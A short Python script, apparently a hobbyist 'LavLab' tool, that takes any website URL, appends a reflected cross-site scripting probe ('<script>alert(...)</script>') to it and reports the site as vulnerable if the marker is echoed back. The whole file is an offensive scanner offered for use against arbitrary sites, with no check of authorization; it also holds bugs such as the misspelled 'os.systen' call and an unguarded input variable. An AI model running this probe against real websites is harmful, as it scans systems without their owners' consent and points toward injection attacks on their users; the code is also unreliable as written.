import urllib.request  as urllib2
import re
import sys,os
import random

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'

Mainlogo =O+ """
        _ (              (
         )\ )           )\ )         )
        (()/(    )  )  (()/(    ) ( /(
         /(_))( /( /((  /(_))( /( )\())
        (_))  )(_)|_))\(_))  )(_)|(_)\
        | |  ((_)__)((_) |  ((_)_| |(_)
        | |__/ _` \ V /| |__/ _` | '_ \
        |____\__,_|\_/ |____\__,_|_.__/

                    ~Tools by- LavSrkari

        """+U

print(Mainlogo)

os.chdir('..')

def XXS():
        print('Enter site:')
        try:
                site = input(B+'LavLab»XXS»'+E)
        except:
                print(F+'\nError'+E)

        if "http://" not in site and "https://"not in site:
                site = 'http://' + site
        else:
                pass

        if "id=" not in site:
                print(F+'[!]'+E+' Site dont have id parametrs')
        else:
                print(W+'[*]'+G+' Site '+site+' have "id" param')

        try:
                res = urllib2.urlopen(site)
        except:
                print(F+'[!] Site not work'+E)
                os.system('python LavLab.py')

        try:
                print(W+'[+]'+G+' Site work'+E)
                scr = ';<script>alert(111111111111111111111);</script>'
                site_xxs = site+scr
                res = urllib2.urlopen(site_xxs)
                info = res.info()
                print('################Info################\n')
                print(info)
                print('####################################\n')
                text = res.read()

                if "111111111111111111111" not in str(text):
                        print(F+'[!]'+' Site not have XXs '+E)
                        os.systen('python LavLab.py')
                else:
                        print(U+W+'[++]'+B+' Site '+site +' have xxs vulnerability'+E)
                        print(W+'Payload: '+G+site_xxs+E)
                        sys.exit(1)

        except:
                print(F+'[!]'+' Fatal Error'+E)
                os.system('python LavLab.py')

XXS()
